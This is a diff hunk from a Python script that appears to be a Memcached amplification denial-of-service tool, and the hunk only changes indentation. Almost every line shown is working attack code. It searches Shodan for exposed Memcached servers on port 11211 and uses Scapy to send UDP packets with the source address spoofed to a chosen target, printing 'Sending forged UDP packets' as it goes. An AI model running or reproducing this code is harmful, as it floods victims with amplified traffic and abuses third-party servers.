@@ -104,33 +104,33 @@ while True:
                 print('')
                 
                 while True:
-            results = api.search('-has_ipv6:true product:"Memcached" port:11211')
+                    results = api.search('-has_ipv6:true product:"Memcached" port:11211')
 
-            engage = y
-            if engage.startswith('y'):
-                if saveme.startswith('y'):
-                    for i in ip_array:
-                        if power>1:
-                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                        elif power==1:
-                            print('[+] Sending 1 forged UDP packet to: %s' % i)
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
-                else:
-                    for result in results['matches']:
-                        if power>1:
-                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                        elif power==1:
-                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('')
-                print('0.0')
-                print('')
+                    engage = y
+                    if engage.startswith('y'):
+                        if saveme.startswith('y'):
+                            for i in ip_array:
+                                if power>1:
+                                    print('[+] Sending %d forged UDP packets to: %s' % (power, i))
+                                    with suppress_stdout():
+                                        send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
+                                elif power==1:
+                                    print('[+] Sending 1 forged UDP packet to: %s' % i)
+                                    with suppress_stdout():
+                                        send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
+                        else:
+                            for result in results['matches']:
+                                if power>1:
+                                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                                    with suppress_stdout():
+                                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                                elif power==1:
+                                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                                    with suppress_stdout():
+                                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                        print('')
+                        print('0.0')
+                        print('')
 
             else:
                 print('')
